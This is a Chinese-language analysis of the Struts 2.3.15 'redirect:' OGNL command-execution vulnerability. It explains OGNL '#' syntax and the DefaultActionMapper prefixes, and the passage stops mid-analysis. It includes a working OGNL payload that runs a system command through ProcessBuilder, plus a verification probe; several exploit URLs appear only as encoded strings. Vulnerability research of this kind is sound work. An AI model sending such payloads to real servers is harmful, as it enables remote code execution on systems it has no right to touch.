
```
ed7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9K6b7e0R3H3z5o6m8Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0V1j5X3I4S2L8X3E0Q4x3V1k6W2P5r3q4E0M7r3I4W2i4K6u0r3h3q4)9J5k6h3q4U0N6r3W2G2L8W2)9K6c8Y4u0W2k6r3W2J5k6h3y4@1i4K6t1#2x3@1q4Q4x3U0f1J5y4q4)9%4b7W2)9J5y4e0t1K6M7X3g2I4i4K6t1#2x3@1c8Q4x3U0f1J5x3$3y4G2L8Y4c8W2P5s2c8Q4x3X3g2Y4k6i4c8Q4x3U0f1J5z5q4)9J5y4e0t1%4j5$3!0E0i4K6u0W2L8%4m8W2L8Y4y4&6L8i4m8Z5L8$3&6&6i4K6u0W2P5s2N6G2M7X3D9J5i4K6u0W2k6r3W2K6M7r3q4@1j5$3S2W2M7W2)9J5k6f1S2@1N6s2m8e0k6i4u0$3L8r3g2@1f1X3g2I4N6h3g2K6N6q4)9J5y4e0t1%4i4K6t1#2x3U0W2Q4x3U0f1J5b7#2)9J5y4e0t1K6j5g2)9J5y4e0y4p5i4K6t1#2x3U0y4J5k6i4q4Q4x3X3g2Y4k6i4c8e0k6i4y4K6K9h3!0F1i4K6t1#2x3U0S2Q4x3U0f1J5z5g2)9J5y4e0u0o6i4K6t1#2x3U0y4T1i4K6t1#2x3@1c8Q4x3U0f1J5x3$3q4Q4x3X3g2Y4k6i4c8e0k6i4u0$3L8r3g2@1b7$3!0F1N6r3g2^5N6q4)9J5y4e0t1^5i4K6t1#2x3U0W2Q4x3U0f1J5b7#2)9J5y4e0t1K6j5#2)9J5y4e0y4p5i4K6t1#2x3U0y4T1i4K6u0W2k6$3g2@1f1X3g2S2L8q4m8S2N6r3S2Q4x3U0f1J5z5q4)9J5y4e0t1J5i4K6t1#2x3V1k6Q4x3U0f1J5x3W2)9J5y4e0t1&6i4K6t1#2x3V1y4Q4x3U0f1J5x3$3#2S2N6s2c8Q4x3U0f1K6c8q4)9J5y4e0t1K6j5$3!0F1N6r3g2^5N6q4)9J5k6h3N6W2N6q4)9J5y4e0t1^5i4K6t1#2x3U0N6U0L8$3#2Q4x3X3g2G2M7r3g2F1M7%4W2E0M7r3S2G2L8Y4W2Q4x3X3g2^5N6$3!0J5K9K6u0Q4x3X3g2V1K9i4y4H3j5i4c8U0K9r3g2J5i4K6u0W2d9s2c8@1M7q4y4W2M7Y4k6D9k6i4c8d9k6i4y4H3L8$3&6K6k6g2)9J5y4e0t1%4i4K6t1#2x3U0W2Q4x3U0f1J5b7#2)9J5y4e0t1K6L8h3q4@1N6q4)9J5k6h3N6W2N6q4N6J5K9i4c8W2M7W2)9J5y4e0t1^5i4K6t1#2x3U0W2Q4x3X3g2H3M7X3W2F1N6r3I4F1i4K6t1#2x3U0S2Q4x3U0f1J5x3$3y4Q4x3U0f1J5z5g2)9J5y4e0u0o6i4K6t1#2x3U0y4E0j5i4c8@1i4K6u0W2k6$3g2@1g2%4u0A6N6r3g2J5i4K6t1#2x3U0S2Q4x3U0f1J5z5g2)9J5k6h3k6D9N6i4y4Z5i4K6t1#2x3U0S2Q4x3U0f1J5z5g2)9J5y4e0u0o6i4K6t1#2x3U0y4E0j5i4c8@1i4K6u0W2k6$3g2@1g2%4u0A6N6r3g2J5i4K6t1#2x3U0S2Q4x3U0f1J5z5g2)9J5k6h3y4D9L8%4y4W2i4K6t1#2x3U0S2Q4x3U0f1J5z5g2)9%4c8l9`.`.
```

回显：

```
/usr/local/development/tomcat7/webapps/struts2-blank/
```

上述测试说明`struts 2.3.15`版本下漏洞是确实存在的。

## 四、漏洞原理分析

首先来解析下可利用URL中的有用信息

```
49bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9K6b7e0R3H3z5o6m8Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0V1j5X3I4S2L8X3E0Q4x3V1k6W2P5r3q4E0M7r3I4W2i4K6u0r3h3q4)9J5k6h3q4U0N6r3W2G2L8W2)9K6c8Y4u0W2k6r3W2J5k6h3y4@1i4K6y4m8i4K6t1@1i4K6N6n7i4K6t1#2x3U0y4S2i4K6t1#2x3$3c8Q4x3U0f1J5z5r3&6W2N6#2)9J5y4e0t1H3K9X3q4$3j5g2)9J5k6h3I4S2L8X3N6Q4x3X3g2b7M7X3!0U0k6i4y4K6b7Y4g2A6L8r3c8W2M7W2)9J5y4e0t1^5L8X3g2%4i4K6t1#2x3U0m8B7j5i4k6S2i4K6u0W2L8r3q4F1k6#2)9J5k6g2y4@1M7X3W2F1k6#2)9#2b7W2)9#2c8q4)9%4b7W2)9J5y4e0t1%4K9h3k6U0L8$3&6X3K9h3N6Q4x3U0f1J5y4#2)9%4c8q4)9J5y4e0t1&6i4K6t1#2x3U0W2Q4x3X3g2K6N6r3q4J5N6q4)9J5y4e0t1^5i4K6t1#2x3U0W2Q4x3V1y4Q4x3U0f1J5x3$3u0Q4x3U0f1K6k6q4)9J5y4e0t1K6j5g2)9J5k6h3N6W2N6p5W2F1M7s2g2@1f1%4c8J5k6h3q4E0i4K6t1#2x3U0S2Q4x3U0f1J5z5g2)9J5b7#2)9J5y4e0t1K6j5#2)9J5y4e0y4V1L8X3g2%4i4K6t1#2x3U0m8B7j5i4k6S2i4K6u0W2K9h3!0Q4x3X3g2u0L8Y4m8#2N6q4y4@1M7X3g2S2L8g2u0W2j5h3c8W2M7W2)9J5y4e0t1^5i4K6t1#2x3U0y4T1i4K6t1#2x3U0W2Q4x3V1y4Q4x3U0f1J5x3$3c8Q4x3U0f1K6k6r3&6W2N6#2)9J5y4e0t1H3K9X3q4$3j5g2)9J5k6h3W2G2i4K6u0W2b7Y4g2X3k6X3g2J5k6h3c8d9k6h3q4V1k6i4u0Q4x3U0f1J5z5q4)9J5y4e0t1K6j5#2)9J5y4e0t1&6i4K6u0o6i4K6t1#2x3U0y4W2i4K6t1#2x3$3c8F1k6i4N6Q4x3U0f1J5x3r3y4Z5j5i4u0Q4y4f1t1#2x3o6l9H3x3q4)9#2c8q4)9J5b7#2)9J5y4e0t1K6k6q4)9J5k6i4u0W2j5h3c8Q4x3U0f1J5z5q4)9J5y4e0t1K6k6g2)9J5y4e0t1&6i4K6u0o6i4K6t1#2x3U0y4E0j5i4c8@1i4K6t1#2x3$3c8Q4x3U0f1J5x3$3y4G2L8Y4c8W2P5s2c8Q4x3X3g2Y4k6i4c8Q4x3U0f1J5z5q4)9J5y4e0t1%4j5$3!0E0i4K6u0W2L8%4m8W2L8Y4y4&6L8i4m8Z5L8$3&6&6i4K6u0W2P5s2N6G2M7X3D9J5i4K6u0W2k6r3W2K6M7r3q4@1j5$3S2W2M7W2)9J5k6f1S2@1N6s2m8e0k6i4u0$3L8r3g2@1f1X3g2K6M7r3!0F1M7$3g2Q4x3U0f1J5y4#2)9J5y4e0t1&6i4K6u0o6i4K6t1#2x3U0y4E0j5i4c8@1i4K6u0W2k6$3g2@1g2%4u0A6N6r3g2J5i4K6t1#2x3U0S2Q4x3U0f1J5z5g2)9J5k6i4m8J5K9h3&6@1L8r3&6Q4x3U0f1J5z5q4)9J5y4e0t1K6k6g2)9J5y4e0t1&6i4K6u0o6i4K6t1#2x3U0y4E0j5i4c8@1i4K6u0W2k6$3g2@1g2%4u0A6N6r3g2J5i4K6t1#2x3U0S2Q4x3U0f1J5z5g2)9J5k6h3k6D9N6i4y4Z5i4K6t1#2x3U0S2Q4x3U0f1J5z5g2)9J5b7#2)9J5y4e0t1K6L8h3q4@1N6q4)9J5k6h3N6W2N6q4N6J5K9i4c8W2M7W2)9J5y4e0t1^5i4K6t1#2x3U0W2Q4x3X3g2U0L8r3!0K6k6g2)9J5y4e0t1^5i4K6t1#2x3U0W2Q4y4@1b7
```

URL解码后为：

```
c2bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9K6b7e0R3H3z5o6m8Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0V1j5X3I4S2L8X3E0Q4x3V1k6W2P5r3q4E0M7r3I4W2i4K6u0r3h3q4)9J5k6h3q4U0N6r3W2G2L8W2)9K6c8Y4u0W2k6r3W2J5k6h3y4@1i4K6y4m8i4K6t1@1i4K6N6n7i4K6t1K6j5g2)9K6c8q4)9J5z5r3&6W2N6H3`.`. java.lang.ProcessBuilder(new java.lang.String[]{'ifconfig'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}
```

`Ifconfig`命令很显然就是真正执行代码，相当于二进制漏洞的`ShellCode`，应该可以这么理解，不对之处还请指正。

通过查找资料，若要验证漏洞是否存在，可以这么测试

```
8a0K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3I4G2j5$3q4D9K9r3!0K6N6q4)9J5c8Y4y4@1M7Y4g2@1M7K6u0Q4x3X3c8T1L8r3q4F1K9#2)9J5c8X3g2^5j5h3#2H3L8r3g2Q4x3V1k6j5i4K6u0W2j5h3y4@1K9h3!0F1i4K6y4r3j5h3y4@1K9h3!0F1i4K6y4m8i4K6t1#2x3U0g2Q4y4@1t1K6i4K6u0m8y4q4)9%4c8l9`.`.
```

原理是

```
/usr/local/development/tomcat7/webapps/struts2-blank/WEB-INF/src/example.xml:

      

<action name="*" class="example.ExampleSupport">

            <result>/example/{1}.jsp</result>

        </action>
```

当`*`匹配到一串精心构造的`OGNL`语句时，会把它放到`{1}`中，形成`OGNL`二次执行。

结果如图：

![](https://bbs.kanxue.com/upload/attach/201307/162756_hp7o9kdsmult748.jpg)

可以看到`{3*4}`作为代码（`OGNL`语句）执行，结果传递给了`{1}`，构造了`12.jsp`。说明`URL`参数中`X.action?redirect:${一大串恶意参数}`，恶意参数被作为代码执行，有些类似于远程代码执行，不过威力更大，不需要软件即可达到这个效果。

现在来看什么是`OGNL`？也是查资料而来。

`OGNL`（`Object Graph Navigation Language`），是一种表达式语言。使用这种表达式语言，你可以通过某种表达式语法，存取`Java`对象树中的任意属性、调用`Java`对象树的方法、同时能够自动实现必要的类型转化。如果我们把表达式看做是一个带有语义的字符串，那么`OGNL`无疑成为了这个语义字符串与`Java`对象之间沟通的桥梁。

`URL`中使用了多个`#`符号，解释如下：

#符号的用途一般有三种。

1 访问非根对象属性，例如`#session.msg`表达式，由于`Struts 2`中值栈被视为根对象，所以访问其他非根对象时，需要加`#`前缀。实际上，`#`相当于`ActionContext. getContext()`；`#session.msg`表达式相当于`ActionContext.getContext().getSession(). getAttribute("msg")`。

2 用于过滤和投影（projecting）集合，如`persons.{?#this.age>25}`，`persons.{?#this.name=='pla1'}.{age}[0]`。

3 用来构造`Map`，例如示例中的`#{'foo1':'bar1', 'foo2':'bar2'}`。

知道了`X.action?redirect:${一大串恶意参数}`中的恶意参数其实为`OGNL`表达式，通过`OGNL`表达式的二次执行来触发漏洞，达到利用的目的。

其次分析漏洞描述信息，`DefaultActionMapper`在处理短路径重定向参数前缀
`"action:"`/`"redirect:"`/`"redirectAction:"`时存在命令执行漏洞，从中可以知道，`Struts2`的`DefaultActionMapper`模块处理`action`时出现的漏洞，来看看
`DefaultActionMapper`模块针对三种重定向参数的处理过程。

在路径：

```
.\struts-2.3.15\src\core\src\main\java\org\apache\struts2\dispatcher\mapper\DefaultActionMapper.java
```

找到了`DefaultActionMapper`模块。

定义重定向相关字符串变量：

```
protected static final String METHOD_PREFIX = "method:";

    protected static final String ACTION_PREFIX = "action:";

    protected static final String REDIRECT_PREFIX = "redirect:";

    protected static final String REDIRECT_ACTION_PREFIX = "redirectAction:";
```

就是重定向参数前缀。

```
protected Pattern allowedActionNames = Pattern.compile("[a-zA-Z0-9._!/\\-]*");
```

顾名思义定义允许的`Action`名字，这是一个关键点，下面会讲到。

再来看是如何处理的：
